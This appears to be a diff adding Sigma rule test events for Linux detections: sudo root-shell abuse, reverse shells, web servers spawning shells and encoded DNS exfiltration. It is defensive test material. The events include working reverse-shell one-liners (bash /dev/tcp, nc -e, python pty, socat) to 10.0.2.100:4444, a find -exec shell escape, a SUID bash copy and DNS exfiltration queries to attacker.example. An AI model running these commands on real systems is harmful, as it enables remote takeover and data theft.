@@ -1,0 +1,69 @@
+# Sigma rule test events: Linux and network rules.
+
+d5e6f7a8-9b0c-1d2e-3f4a-5b6c7d8e9f01:  # sudo root shell / privilege tampering
+  - name: sudo straight into bash
+    match: true
+    event: {message: 'Oct 25 10:00:01 ubuntu-srv sudo:     omar : TTY=pts/0 ; PWD=/home/omar ; USER=root ; COMMAND=/bin/bash'}
+  - name: GTFOBins find -exec shell escape
+    match: true
+    event: {message: 'Oct 25 10:00:01 ubuntu-srv sudo:  www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ; -quit'}
+  - name: SUID bit set on a copy of bash
+    match: true
+    event: {message: 'Oct 25 10:00:01 ubuntu-srv sudo:     omar : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod u+s /tmp/.b'}
+  - name: user not in sudoers
+    match: true
+    event: {message: 'Oct 25 10:00:01 ubuntu-srv sudo:  www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash'}
+  - name: routine package update through sudo
+    match: false
+    event: {message: 'Oct 25 10:00:01 ubuntu-srv sudo:     omar : TTY=pts/0 ; PWD=/home/omar ; USER=root ; COMMAND=/usr/bin/apt update'}
+  - name: sudo session bookkeeping line
+    match: false
+    event: {message: 'Oct 25 10:00:01 ubuntu-srv sudo: pam_unix(sudo:session): session opened for user root(uid=0) by omar(uid=1000)'}
+
+91bff04e-b442-45be-83fc-56b25ef8997d:  # Linux reverse shell one-liner
+  - name: bash /dev/tcp
+    match: true
+    event: {Image: /usr/bin/bash, CommandLine: 'bash -c bash -i >& /dev/tcp/10.0.2.100/4444 0>&1'}
+  - name: netcat with -e
+    match: true
+    event: {Image: /usr/bin/nc.traditional, CommandLine: 'nc -e /bin/sh 10.0.2.100 4444'}
+  - name: python pty reverse shell
+    match: true
+    event: {Image: /usr/bin/python3, CommandLine: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.2.100\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"}
+  - name: socat exec
+    match: true
+    event: {Image: /usr/bin/socat, CommandLine: 'socat tcp:10.0.2.100:4444 exec:/bin/bash,pty,stderr'}
+  - name: netcat port check
+    match: false
+    event: {Image: /usr/bin/nc, CommandLine: 'nc -zv 10.0.0.51 22'}
+
+7081ec7c-3368-4fab-a3d4-5cff951fb266:  # web server spawned a shell
+  - name: apache2 (mod_php) spawning sh
+    match: true
+    event: {ParentImage: /usr/sbin/apache2, Image: /usr/bin/dash, CommandLine: 'sh -c id'}
+  - name: php-fpm worker spawning whoami
+    match: true
+    event: {ParentImage: /usr/sbin/php-fpm8.1, Image: /usr/bin/whoami, CommandLine: whoami}
+  - name: apache2 spawning its own log rotation helper
+    match: false
+    event: {ParentImage: /usr/sbin/apache2, Image: /usr/bin/rotatelogs, CommandLine: '/usr/bin/rotatelogs /var/log/apache2/access.%Y-%m-%d 86400'}
+  - name: shell started by sshd
+    match: false
+    event: {ParentImage: /usr/sbin/sshd, Image: /usr/bin/bash, CommandLine: '-bash'}
+
+e6f7a8b9-0c1d-2e3f-4a5b-6c7d8e9f0123:  # oversized encoded DNS label
+  - name: base64-ish exfil label (52 chars)
+    match: true
+    event: {query: aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbHRyYXRlZCBkYXRhMTIz.exfil.attacker.example}
+  - name: dnscat2 default prefix
+    match: true
+    event: {query: dnscat.3a1b0101f6b2c48e9a.attacker.example}
+  - name: normal web lookup
+    match: false
+    event: {query: www.google.com}
+  - name: long hashed hostname on an allow-listed platform
+    match: false
+    event: {query: d1a2b3c4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b.s3.amazonaws.com}
+  - name: 44-character label stays under the threshold
+    match: false
+    event: {query: abcdefghijabcdefghijabcdefghijabcdefghijabcd.example.com}
